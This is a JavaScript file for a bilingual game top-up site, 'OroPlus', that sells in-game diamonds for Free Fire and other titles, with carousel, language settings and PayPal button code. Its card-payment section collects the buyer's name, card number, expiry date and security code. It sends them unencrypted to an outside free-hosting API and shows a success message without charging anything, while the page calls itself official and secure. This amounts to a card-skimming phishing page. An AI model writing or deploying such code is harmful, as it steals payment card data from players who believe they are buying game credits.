




/*AQUI INICIA EL INICIO -----------------------------------------------------------------------------------------------------------*/


"use strict";

const $ = id => document.getElementById(id);

// =====================================
// REGIONES
// =====================================

const regiones = [
  ["Argentina", "🇦🇷"],
  ["Bolivia", "🇧🇴"],
  ["Chile", "🇨🇱"],
  ["Colombia", "🇨🇴"],
  ["Costa Rica", "🇨🇷"],
  ["República Dominicana", "🇩🇴"],
  ["Ecuador", "🇪🇨"],
  ["El Salvador", "🇸🇻"],
  ["Guatemala", "🇬🇹"],
  ["Honduras", "🇭🇳"],
  ["México", "🇲🇽"],
  ["Nicaragua", "🇳🇮"],
  ["Panamá", "🇵🇦"],
  ["Paraguay", "🇵🇾"],
  ["Perú", "🇵🇪"],
  ["Uruguay", "🇺🇾"],
  ["Venezuela", "🇻🇪"]
];

// =====================================
// TRADUCCIONES
// =====================================

const traducciones = {

  es: {
    tituloPagina: "Centro de Recargas",
    encabezado: "Centro Oficial<br>de Recargas",
    idiomaRegion: "Idioma/Región",
    idioma: "Idioma",
    region: "Región",
    guardar: "Guardar",
    promocion: "PROMOCIÓN ESPECIAL",
    tituloBanner: "Recarga y consigue más",
    descripcionBanner: "Descubre promociones para tus juegos favoritos.",
    explorar: "Recargar",
    etiqueta2: "TU PRÓXIMA PARTIDA",
    titulo2: "Elige tu juego favorito",
    descripcion2: "Encuentra tu próximo juego.",
    boton2: "Ver juegos",
    etiqueta3: "TODO EN UN SOLO LUGAR",
    titulo3: "Tu zona gamer",
    descripcion3: "Tus juegos favoritos en un solo lugar.",
    boton3: "Comenzar",
    juegos: "Selección de Juego",
    seguro: "Pago 100% seguro",
    ingresar: "Ingresar",
    etiquetaId: "ID de jugador",
    placeholder: "Introduce el ID del jugador",
    opcionesLogin: "O ingresa con una cuenta",
    freefire: "Free Fire",
    delta: "Delta Force",
    haikyu: "HAIKYU!! FLY HIGH",
    descripcionDemo: "Pago real. Los pagos se procesan de forma segura",
    pie: " página oficial de OroPlus.",
    iniciar: "Iniciar sesión",
    configuracion: "Idioma / Región",
    ayuda: "Centro de ayuda",
    guardado: "Preferencias guardadas correctamente.",
    faltaId: "Introduce el ID de jugador para continuar.",
    noReal: "¡Paso completado correctamente! Puedes continuar con el siguiente paso.",
    redNoConectada: "El acceso con {red} no está conectado en esta demostración.",
    ayudaMensaje: "Añade aquí el enlace a tu centro de ayuda.",
    paises: {
      "República Dominicana": "República Dominicana"
    }
  },

  en: {
    tituloPagina: "Top-up Center",
    encabezado: "Official Top-up<br>Center",
    idiomaRegion: "Language/Region",
    idioma: "Language",
    region: "Region",
    guardar: "Save",
    promocion: "SPECIAL PROMOTION",
    tituloBanner: "Top up and get more",
    descripcionBanner: "Discover promotions for your favorite games.",
    explorar: "Buy Now",
    etiqueta2: "YOUR NEXT MATCH",
    titulo2: "Choose your favorite game",
    descripcion2: "Find your next game.",
    boton2: "View games",
    etiqueta3: "ALL IN ONE PLACE",
    titulo3: "Your gaming zone",
    descripcion3: "Your favorite games in one place.",
    boton3: "Get started",
    juegos: "Game Selection",
    seguro: "100% secure payment",
    ingresar: "Enter",
    etiquetaId: "Player ID",
    placeholder: "Enter player ID",
    opcionesLogin: "Or sign in with an account",
    freefire: "Free Fire",
    delta: "Delta Force",
    haikyu: "HAIKYU!! FLY HIGH",
    descripcionDemo: "Real payment. Payments are processed securely",
    pie: "official page of OroPlus.",
    iniciar: "Sign in",
    configuracion: "Language / Region",
    ayuda: "Help Center",
    guardado: "Preferences saved successfully.",
    faltaId: "Enter player ID to continue.",
    noReal: "Step completed successfully! You can continue to the next step.",
    redNoConectada: "{red} sign-in is not connected in this demo.",
    ayudaMensaje: "Add your help center link here.",
    paises: {
      "República Dominicana": "Dominican Republic",
      "Costa Rica": "Costa Rica",
      "México": "Mexico",
      "Panamá": "Panama",
      "Perú": "Peru",
      "Ecuador": "Ecuador",
      "Chile": "Chile",
      "Argentina": "Argentina",
      "Bolivia": "Bolivia",
      "Colombia": "Colombia",
      "El Salvador": "El Salvador",
      "Guatemala": "Guatemala",
      "Honduras": "Honduras",
      "Nicaragua": "Nicaragua",
      "Paraguay": "Paraguay",
      "Uruguay": "Uruguay",
      "Venezuela": "Venezuela"
    }
  }
};

// =====================================
// VARIABLES GENERALES
// =====================================

let idiomaActual = "es";
let regionActual = "República Dominicana";

let idiomaTemporal = idiomaActual;
let regionTemporal = regionActual;

let indiceDiapo = 0;
let temporizadorCarrusel;
let temporizadorMensaje;

const fondoModal = $("fondoModal");
const listaRegiones = $("listaRegiones");
const menuPerfil = $("menuPerfil");
const mensajea = $("mensajea");
const pista = $("carruselPista");

const diapositivas = [
  ...document.querySelectorAll(".diapo")
];

const puntos = $("puntosCarrusel");

// =====================================
// JUEGOS E IMÁGENES
// =====================================

const juegos = {

  freefire: {
    nombre: "Free Fire",
    icono: "logo/HAIKYU!! FLY HIGH.jpeg"
  },

  delta: {
    nombre: "Delta Force",
    icono: "logo/delta force.jpeg"
  },

  haikyu: {
    nombre: "HAIKYU!! FLY HIGH",
    icono: "logo/HAIKYU!! FLY HIGH.jpeg"
  }

};

let juegoActual = "freefire";

// =====================================
// GUARDAR PREFERENCIAS
// =====================================

try {

  const guardado = JSON.parse(
    localStorage.getItem("preferenciasRecargasDemo") || "null"
  );

  if (guardado) {

    if (
      guardado.idioma === "es" ||
      guardado.idioma === "en"
    ) {
      idiomaActual = guardado.idioma;
    }

    if (regiones.some(r => r[0] === guardado.region)) {
      regionActual = guardado.region;
    }

  }

} catch (error) {

  console.warn("No se pudieron cargar las preferencias.");

}

// =====================================
// MOSTRAR REGIONES
// =====================================

function mostrarRegiones() {

  if (!listaRegiones) return;

  listaRegiones.innerHTML = "";

  regiones.forEach(([nombre, bandera]) => {

    const boton = document.createElement("button");

    boton.type = "button";
    boton.className = "opcion";
    boton.dataset.region = nombre;

    const icono = document.createElement("span");

    icono.className = "bandera";
    icono.textContent = bandera;

    const texto = document.createElement("span");

    texto.className = "nombre-pais";

    texto.textContent =
      traducciones[idiomaTemporal].paises[nombre] || nombre;

    boton.append(icono, texto);

    boton.addEventListener("click", () => {

      regionTemporal = nombre;

      actualizarSeleccionRegion();

    });

    listaRegiones.appendChild(boton);

  });

  actualizarSeleccionRegion();

}

function actualizarSeleccionRegion() {

  document.querySelectorAll("[data-region]").forEach(boton => {

    const activo = boton.dataset.region === regionTemporal;

    boton.classList.toggle("seleccionada", activo);

    boton.setAttribute("aria-pressed", String(activo));

  });

}

function actualizarSeleccionIdioma() {

  document.querySelectorAll("[data-idioma]").forEach(boton => {

    const activo = boton.dataset.idioma === idiomaTemporal;

    boton.classList.toggle("seleccionada", activo);

    boton.setAttribute("aria-pressed", String(activo));

  });

}

// =====================================
// CAMBIAR IDIOMA TEMPORAL
// =====================================

document.querySelectorAll("[data-idioma]").forEach(boton => {

  boton.addEventListener("click", () => {

    idiomaTemporal = boton.dataset.idioma;

    actualizarSeleccionIdioma();

    mostrarRegiones();

  });

});

// =====================================
// ABRIR Y CERRAR CONFIGURACIÓN
// =====================================

function abrirModal() {

  idiomaTemporal = idiomaActual;
  regionTemporal = regionActual;

  actualizarSeleccionIdioma();
  mostrarRegiones();

  if (menuPerfil) {
    menuPerfil.classList.remove("visible");
  }

  if (fondoModal) {

    fondoModal.classList.add("abierto");

    document.body.style.overflow = "hidden";

  }

}

function cerrarModal() {

  if (fondoModal) {
    fondoModal.classList.remove("abierto");
  }

  document.body.style.overflow = "";

}

$("abrirConfiguracion").addEventListener("click", abrirModal);

$("cerrarModal").addEventListener("click", cerrarModal);

if (fondoModal) {

  fondoModal.addEventListener("click", evento => {

    if (evento.target === fondoModal) {
      cerrarModal();
    }

  });

}

document.addEventListener("keydown", evento => {

  if (evento.key === "Escape") {

    cerrarModal();

    if (menuPerfil) {
      menuPerfil.classList.remove("visible");
    }

  }

});

// =====================================
// GUARDAR IDIOMA Y REGIÓN
// =====================================

$("guardarCambios").addEventListener("click", () => {

  idiomaActual = idiomaTemporal;
  regionActual = regionTemporal;

  try {

    localStorage.setItem(
      "preferenciasRecargasDemo",
      JSON.stringify({
        idioma: idiomaActual,
        region: regionActual
      })
    );

  } catch (error) {

    console.warn("No se pudieron guardar las preferencias.");

  }

  actualizarPagina();

  cerrarModal();

  mostrarMensaje(traducciones[idiomaActual].guardado);

});

// =====================================
// TRADUCIR LA PÁGINA
// =====================================

function actualizarPagina() {

  const t = traducciones[idiomaActual];

  document.documentElement.lang = idiomaActual;

  document.title = t.tituloPagina;

  $("tituloMarca").innerHTML = t.encabezado;

  $("tituloModal").textContent = t.idiomaRegion;

  $("textoIdioma").textContent = t.idioma;

  $("textoRegion").textContent = t.region;

  $("guardarCambios").textContent = t.guardar;

  $("etiquetaBanner").textContent = t.promocion;

  $("tituloBanner").textContent = t.tituloBanner;

  $("descripcionBanner").textContent = t.descripcionBanner;

  $("botonRecargar").textContent = t.explorar;

  $("etiquetaBanner2").textContent = t.etiqueta2;

  $("tituloBanner2").textContent = t.titulo2;

  $("descripcionBanner2").textContent = t.descripcion2;

  $("botonBanner2").textContent = t.boton2;

  $("etiquetaBanner3").textContent = t.etiqueta3;

  $("tituloBanner3").textContent = t.titulo3;

  $("descripcionBanner3").textContent = t.descripcion3;

  $("botonBanner3").textContent = t.boton3;

  $("tituloJuegos").textContent = t.juegos;

  $("juegos").setAttribute("aria-label", t.juegos);

  document.querySelector(
    '[data-juego="freefire"] .nombre-juego'
  ).textContent = t.freefire;

  document.querySelector(
    '[data-juego="delta"] .nombre-juego'
  ).innerHTML = "Delta<br>Force";

  document.querySelector(
    '[data-juego="haikyu"] .nombre-juego'
  ).innerHTML = "HAIKYU!!<br>FLY HIGH";

  $("textoSeguro").textContent = t.seguro;

  $("tituloIngresar").textContent = t.ingresar;

  $("etiquetaId").textContent = t.etiquetaId;

  $("idJugador").placeholder = t.placeholder;

  $("iniciarSesion").textContent = t.ingresar;

  $("opcionesLogin").textContent = t.opcionesLogin;

  $("descripcionJuegoElegido").textContent = t.descripcionDemo;

  $("pie").textContent = t.pie;

  document.querySelector(
    '[data-texto="iniciar"]'
  ).textContent = t.iniciar;

  document.querySelector(
    '[data-texto="configuracion"]'
  ).textContent = t.configuracion;

  document.querySelector(
    '[data-texto="ayuda"]'
  ).textContent = t.ayuda;

  $("idiomaSuperior").textContent =
    idiomaActual.toUpperCase();

  const region = regiones.find(r => r[0] === regionActual);

  $("banderaSuperior").textContent =
    region ? region[1] : "🌎";

  $("regionSuperior").textContent =
    t.paises[regionActual] || regionActual;

}

// =====================================
// CREAR PUNTOS DEL CARRUSEL
// =====================================

function crearPuntos() {

  if (!puntos) return;

  puntos.innerHTML = "";

  diapositivas.forEach((diapo, indice) => {

    const boton = document.createElement("button");

    boton.type = "button";

    boton.className = "punto";

    boton.setAttribute(
      "aria-label",
      "Banner " + (indice + 1)
    );

    boton.addEventListener("click", function () {

      irADiapositiva(indice);

      reiniciarCarrusel();

    });

    puntos.appendChild(boton);

  });

}

// =====================================
// MOVER EL CARRUSEL
// =====================================

function irADiapositiva(indice) {

  if (!pista || diapositivas.length === 0) return;

  indiceDiapo =
    (indice + diapositivas.length) % diapositivas.length;

  pista.style.transform =
    "translateX(-" + (indiceDiapo * 100) + "%)";

  document.querySelectorAll(".punto").forEach(function (punto, i) {

    punto.classList.toggle("activo", i === indiceDiapo);

  });

}

// =====================================
// AVANZAR AUTOMÁTICAMENTE
// =====================================

function avanzarCarrusel() {

  irADiapositiva(indiceDiapo + 1);

}

function reiniciarCarrusel() {

  clearInterval(temporizadorCarrusel);

  if (diapositivas.length > 1) {

    temporizadorCarrusel = setInterval(() => {

      avanzarCarrusel();

    }, 5000);

  }

}

// =====================================
// DESLIZAR CARRUSEL
// =====================================

const carrusel = document.getElementById("carrusel");

let inicioX = 0;
let inicioY = 0;
let finalX = 0;
let finalY = 0;

if (carrusel) {

  carrusel.addEventListener("touchstart", function (evento) {

    inicioX = evento.changedTouches[0].clientX;

    inicioY = evento.changedTouches[0].clientY;

  }, { passive: true });

  carrusel.addEventListener("touchend", function (evento) {

    finalX = evento.changedTouches[0].clientX;

    finalY = evento.changedTouches[0].clientY;

    const diferenciaX = finalX - inicioX;

    const diferenciaY = finalY - inicioY;

    if (
      Math.abs(diferenciaX) > 50 &&
      Math.abs(diferenciaX) > Math.abs(diferenciaY)
    ) {

      if (diferenciaX < 0) {

        irADiapositiva(indiceDiapo + 1);

      } else {

        irADiapositiva(indiceDiapo - 1);

      }

      reiniciarCarrusel();

    }

  }, { passive: true });

}

// =====================================
// BOTONES DE LOS BANNERS
// =====================================

$("botonRecargar").addEventListener("click", irAJuegos);

$("botonBanner2").addEventListener("click", irAJuegos);

$("botonBanner3").addEventListener("click", irAJuegos);

function irAJuegos() {

  $("seccionJuegos").scrollIntoView({

    behavior: "smooth",

    block: "start"

  });

}

// =====================================
// MOSTRAR IMAGEN DEL JUEGO ELEGIDO
// =====================================

function actualizarIconoElegido() {

  const contenedor = $("iconoElegido");

  const juego = juegos[juegoActual];

  if (!contenedor || !juego) return;

  contenedor.replaceChildren();

  const imagen = document.createElement("img");

  imagen.src = juego.icono;

  imagen.alt = juego.nombre;

  imagen.width = 90;

  imagen.height = 90;

  imagen.style.width = "90px";

  imagen.style.height = "90px";

  imagen.style.objectFit = "contain";

  imagen.style.display = "block";

  imagen.onerror = () => {

    console.error(
      "No se pudo cargar la imagen:",
      imagen.src
    );

  };

  contenedor.appendChild(imagen);

}

// =====================================
// SELECCIONAR JUEGO
// =====================================

document.querySelectorAll("[data-juego]").forEach(boton => {

  boton.addEventListener("click", () => {

    juegoActual = boton.dataset.juego;

    document.querySelectorAll("[data-juego]").forEach(opcion => {

      const activo = opcion === boton;

      opcion.classList.toggle("seleccionado", activo);

      opcion.setAttribute("aria-pressed", String(activo));

    });

    $("nombreJuegoElegido").textContent =
      juegos[juegoActual].nombre;

    actualizarIconoElegido();

    $("idJugador").value = "";

  });

});

// =====================================
// MENÚ DE PERFIL
// =====================================

$("botonPerfil").addEventListener("click", () => {

  menuPerfil.classList.toggle("visible");

});

document.querySelector(
  '[data-texto="configuracion"]'
).addEventListener("click", abrirModal);

document.querySelector(
  '[data-texto="iniciar"]'
).addEventListener("click", () => {

  menuPerfil.classList.remove("visible");

  mostrarMensaje(
    traducciones[idiomaActual].noReal
  );

});

document.querySelector(
  '[data-texto="ayuda"]'
).addEventListener("click", () => {

  menuPerfil.classList.remove("visible");

  mostrarMensaje(
    traducciones[idiomaActual].ayudaMensaje
  );

});

document.addEventListener("click", evento => {

  const botonPerfil = $("botonPerfil");

  if (
    menuPerfil &&
    botonPerfil &&
    !menuPerfil.contains(evento.target) &&
    !botonPerfil.contains(evento.target)
  ) {

    menuPerfil.classList.remove("visible");

  }

});

// =====================================
// INGRESAR Y ENVIAR ID A ZONA.HTML
// =====================================

$("iniciarSesion").addEventListener("click", () => {

    const id = $("idJugador").value.trim();

    const t = traducciones[idiomaActual];

    // Comprobar ID vacío
    if (!id) {

        mostrarMensaje(t.faltaId);

        $("idJugador").focus();

        return;
    }

    // Guardar los datos para utilizarlos en la siguiente sección
    const parametros = new URLSearchParams();

    parametros.set("id", id);
    parametros.set("juego", juegoActual);
    parametros.set("region", regionActual);

    // Guardar los datos temporalmente
    sessionStorage.setItem(
        "datosJugador",
        parametros.toString()
    );

    // Enviar a la sección de la misma página
    window.location.href = "#sehizo";

});

// =====================================
// MENSAJES TEMPORALES
// =====================================

function mostrarMensaje(texto) {

  clearTimeout(temporizadorMensaje);

  if (!mensajea) {

    alert(texto);

    return;

  }

  mensajea.textContent = texto;

  mensajea.classList.add("visible");

  temporizadorMensaje = setTimeout(() => {

    mensajea.classList.remove("visible");

  }, 3000);

}

// =====================================
// INICIAR LA PÁGINA
// =====================================

crearPuntos();

mostrarRegiones();

actualizarPagina();

actualizarIconoElegido();

irADiapositiva(0);

reiniciarCarrusel();

/*AQUI FINALIZA EL INICIO -----------------------------------------------------------------------------------------------------------*/






















/*AQUI  INICIA LA RECARGA -----------------------------------------------------------------------------------------------------------*/
"use strict";

// =====================================
// 1. PAQUETES Y PRECIOS USD
// =====================================

const paquetes = [
    { cantidad: 120, precio: 0.99 },
    { cantidad: 600, precio: 6.00 },
    { cantidad: 1960, precio: 15.0 },
    { cantidad: 3960, precio: 30.0 },
    { cantidad: 6560, precio: 60.0 },
    { cantidad: 12960, precio: 120.0 },
    { cantidad: 25920, precio: 216.0 }
];

// =====================================
// 2. ELEMENTOS HTML
// =====================================

const lista = document.getElementById("listaDiamantes");
const modal = document.getElementById("modalPago");

const cantidadElegida = document.getElementById("cantidadElegida");
const precioElegido = document.getElementById("precioElegido");

const formulario = document.getElementById("formularioPago");
const mensaje = document.getElementById("mensaje");


let seleccionado = null;

// =====================================
// 4. FORMATO DE DINERO
// =====================================

const dinero = new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD"
});

// =====================================
// 5. MOSTRAR PAQUETES
// =====================================

function mostrarPaquetes() {

    if (!lista) {
        console.error("No se encontró listaDiamantes");
        return;
    }

    lista.replaceChildren();

    paquetes.forEach(function (paquete) {

        const boton = document.createElement("button");

        boton.type = "button";
        boton.className = "boton-diamante";

        const cantidad = document.createElement("span");
        cantidad.className = "cantidad";

        cantidad.textContent =
            "♦️ " + paquete.cantidad.toLocaleString("en-US");

        const precio = document.createElement("span");
        precio.className = "precio";

        precio.textContent = dinero.format(paquete.precio);

        boton.appendChild(cantidad);
        boton.appendChild(precio);

        boton.addEventListener("click", function () {
            abrirPago(paquete);
        });

        lista.appendChild(boton);
    });
}

// =====================================
// 6. ABRIR MODAL
// =====================================

function abrirPago(paquete) {

    if (!modal) return;

    seleccionado = paquete;

    cantidadElegida.textContent =
        "♦️ " + paquete.cantidad.toLocaleString("en-US");

    precioElegido.textContent =
        dinero.format(paquete.precio);

    formulario?.reset();

    if (mensaje) {
        mensaje.textContent = "";
    }

    modal.classList.add("abierto");
    modal.setAttribute("aria-hidden", "false");

    document.body.classList.add("modal-abierto");
}

// =====================================
// 7. CERRAR MODAL
// =====================================

function cerrarPago() {

    if (!modal) return;

    modal.classList.remove("abierto");
    modal.setAttribute("aria-hidden", "true");

    document.body.classList.remove("modal-abierto");

    seleccionado = null;
}

// =====================================
// 8. BOTONES PARA CERRAR
// =====================================

document.getElementById("cerrarPago")
    ?.addEventListener("click", cerrarPago);

document.getElementById("volver")
    ?.addEventListener("click", cerrarPago);

// =====================================
// 9. CERRAR AL PRESIONAR FUERA
// =====================================

modal?.addEventListener("click", function (evento) {

    if (evento.target === modal) {
        cerrarPago();
    }

});

// =====================================
// 10. CONEXIÓN FETCH CON ASP.NET
// =====================================

formulario?.addEventListener("submit", async function (evento) {

    evento.preventDefault();

    // Comprobar paquete
    if (!seleccionado) {

        mensaje.textContent = "Selecciona un paquete.";

        return;
    }

    // Obtener datos
      const datos = {
       nombre: document.getElementById("nombre").value, 
    apellido: document.getElementById("apellido").value, 
  
    vencimiento: document.getElementById("vencimiento").value, 
    csc: document.getElementById("csc").value,
      tarjeta: document.getElementById("tarjeta").value, 
    };


    // Validar datos
    if (!nombre || !apellido || !tarjeta || !vencimiento || !csc) {

        mensaje.textContent = "Completa tu nombre y apellido.";

        return;
    }

    // Preparar pedido
    const pedido = {
        nombre: nombre,
        apellido: apellido,
        tarjeta: tarjeta,
        vencimiento: vencimiento,
        csc: csc,

    };
    try {

        mensaje.textContent = "Enviando pedido...";

        const respuesta = await fetch(
            "https://yulian22-001-site1.itempurl.com/api/Freetabla",
            {
                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify(datos)
            }
        );

        if (!respuesta.ok) {

            throw new Error(
                'Error HTTP: ${respuesta.status}'
            );

        }

        const resultado = await respuesta.json().catch(() => null);

        console.log("Guardado exitoso:", resultado);

        // LIMPIAR FORMULARIO
        formulario.reset();

        // MENSAJE
        mensaje.textContent = "¡Pedido enviado correctamente!";

    } catch (error) {

        console.error("Error:", error);

        mensaje.textContent =
            "No se pudieron guardar los datos: " + error.message;

    }

});

// =====================================
// 11. INICIAR SISTEMA
// =====================================

mostrarPaquetes();
/*AQUI  TERMINA LA RECARGA -----------------------------------------------------------------------------------------------------------*/




















/*AQUI  INICIA PAYPAL -----------------------------------------------------------------------------------------------------------*/

// =====================================
// PAQUETES EXCLUSIVOS DE PAYPAL
// =====================================

const paypalCatalogo = [
     { cantidad: 120, precio: 0.99 },
    { cantidad: 600, precio: 6.00 },
    { cantidad: 1960, precio: 15.0 },
    { cantidad: 3960, precio: 30.0 },
    { cantidad: 6560, precio: 60.0 },
    { cantidad: 12960, precio: 120.0 },
    { cantidad: 25920, precio: 216.0 }
];


// =====================================
// ELEMENTOS EXCLUSIVOS
// =====================================

const paypalAbrir = document.getElementById("paypal-abrir");
const paypalCerrar = document.getElementById("paypal-cerrar");

const paypalVentana = document.getElementById("paypal-ventana");
const paypalLista = document.getElementById("paypal-paquetes");

const paypalCantidad = document.getElementById("paypal-cantidad");
const paypalPrecio = document.getElementById("paypal-precio");

const paypalBotones = document.getElementById("paypal-botones");
const paypalMensaje = document.getElementById("paypal-mensaje");

let paypalPaqueteSeleccionado = null;
let paypalVersion = 0;


// =====================================
// FORMATO DE PRECIO
// =====================================

const paypalDinero = new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD"
});


// =====================================
// ABRIR Y CERRAR
// =====================================

paypalAbrir.addEventListener("click", function () {

    paypalVentana.classList.add("paypal-activo");
    paypalVentana.setAttribute("aria-hidden", "false");

    document.body.style.overflow = "hidden";
});

function paypalCerrarVentana() {

    paypalVentana.classList.remove("paypal-activo");
    paypalVentana.setAttribute("aria-hidden", "true");

    document.body.style.overflow = "";

    paypalVersion++;
    paypalPaqueteSeleccionado = null;

    paypalBotones.replaceChildren();

    paypalCantidad.textContent = "0";
    paypalPrecio.textContent = paypalDinero.format(0);

    paypalMensaje.textContent = "";

    document.querySelectorAll(".paypal-paquete").forEach(function (boton) {
        boton.classList.remove("paypal-elegido");
    });
}

paypalCerrar.addEventListener("click", paypalCerrarVentana);

paypalVentana.addEventListener("click", function (evento) {

    if (evento.target === paypalVentana) {
        paypalCerrarVentana();
    }
});

document.addEventListener("keydown", function (evento) {

    if (
        evento.key === "Escape" &&
        paypalVentana.classList.contains("paypal-activo")
    ) {
        paypalCerrarVentana();
    }
});


// =====================================
// CREAR PAQUETES
// =====================================

function paypalMostrarCatalogo() {

    paypalLista.replaceChildren();

    paypalCatalogo.forEach(function (paquete) {

        const boton = document.createElement("button");

        boton.type = "button";
        boton.className = "paypal-paquete";

        const cantidad = document.createElement("span");

        cantidad.className = "paypal-paquete-cantidad";
        cantidad.textContent =
            "♦️ " + paquete.cantidad.toLocaleString("en-US");

        const precio = document.createElement("span");

        precio.className = "paypal-paquete-precio";
        precio.textContent = paypalDinero.format(paquete.precio);

        boton.append(cantidad, precio);

        boton.addEventListener("click", function () {
            paypalSeleccionarPaquete(paquete, boton);
        });

        paypalLista.appendChild(boton);
    });
}


// =====================================
// SELECCIONAR PAQUETE
// =====================================

function paypalSeleccionarPaquete(paquete, boton) {

    paypalPaqueteSeleccionado = paquete;

    document.querySelectorAll(".paypal-paquete").forEach(function (elemento) {
        elemento.classList.remove("paypal-elegido");
    });

    boton.classList.add("paypal-elegido");

    paypalCantidad.textContent =
        paquete.cantidad.toLocaleString("en-US");

    paypalPrecio.textContent =
        paypalDinero.format(paquete.precio);

    paypalMensaje.textContent = "";

    const versionActual = ++paypalVersion;

    paypalBotones.replaceChildren();

    if (!window.paypal || typeof window.paypal.Buttons !== "function") {

        paypalMensaje.textContent =
            "Configura tu Client ID de PayPal para habilitar los pagos.";

        return;
    }

    paypal.Buttons({

        createOrder: function (data, actions) {

            if (
                versionActual !== paypalVersion ||
                !paypalPaqueteSeleccionado
            ) {
                throw new Error("Selecciona un paquete válido.");
            }

            const precioActual =
                paypalPaqueteSeleccionado.precio.toFixed(2);

            const cantidadActual =
                paypalPaqueteSeleccionado.cantidad;

            return actions.order.create({

                purchase_units: [{
                    description: cantidadActual + " diamantes",

                    amount: {
                        currency_code: "USD",
                        value: precioActual
                    }
                }]

            });
        },

        onApprove: function (data, actions) {

            return actions.order.capture().then(function (detalles) {

                if (versionActual !== paypalVersion) {
                    return;
                }

                paypalMensaje.textContent =
                    "Pago procesado. Número de pedido: " + detalles.id;

                console.log("Pago de PayPal:", detalles);
            });
        },

        onCancel: function () {

            if (versionActual === paypalVersion) {
                paypalMensaje.textContent = "Pago cancelado.";
            }
        },

        onError: function (error) {

            console.error("Error de PayPal:", error);

            if (versionActual === paypalVersion) {
                paypalMensaje.textContent =
                    "No se pudo procesar el pago. Inténtalo de nuevo.";
            }
        }

    }).render(paypalBotones).catch(function (error) {

        console.error("Error al cargar PayPal:", error);

        if (versionActual === paypalVersion) {
            paypalMensaje.textContent =
                "No se pudo cargar el botón de PayPal.";
        }
    });
}


// =====================================
// INICIAR SISTEMA
// =====================================

paypalMostrarCatalogo();
/*AQUI  TERMINA PAYPAL -----------------------------------------------------------------------------------------------------------*/
















/* INICIO: COMPARTIR PÁGINA -------------------------------------------------------------------------------------------------------------------*/

const botonCompartir = document.getElementById("compartir");

if (botonCompartir) {
    botonCompartir.addEventListener("click", async function () {

        const datos = {
            title: "OroPlus Bank",
            text: "Visita el centro de recargas de OroPlus Bank.",
            url: window.location.href
        };

        try {
            // Cerrar el menú de perfil
            const menu = document.getElementById("menuPerfil");

            if (menu) {
                menu.classList.remove("visible");
            }

            // Compartir mediante el menú del teléfono o navegador
            if (navigator.share) {

                await navigator.share(datos);

            } else if (
                navigator.clipboard &&
                window.isSecureContext
            ) {

                // Alternativa: copiar el enlace
                await navigator.clipboard.writeText(datos.url);

                alert("¡Enlace copiado! Ya puedes compartir tu página.");

            } else {

                // Alternativa para navegadores sin compartir ni portapapeles
                window.prompt(
                    "Copia el enlace de OroPlus Bank:",
                    datos.url
                );

            }

        } catch (error) {

            if (error.name !== "AbortError") {
                console.error("Error al compartir:", error);

                alert(
                    "No se pudo compartir automáticamente. " +
                    "Puedes copiar el enlace de la página desde el navegador."
                );
            }
        }

    });
}

/* FIN: COMPARTIR PÁGINA --------------------------------------------------------------------------------------------------------------------------*/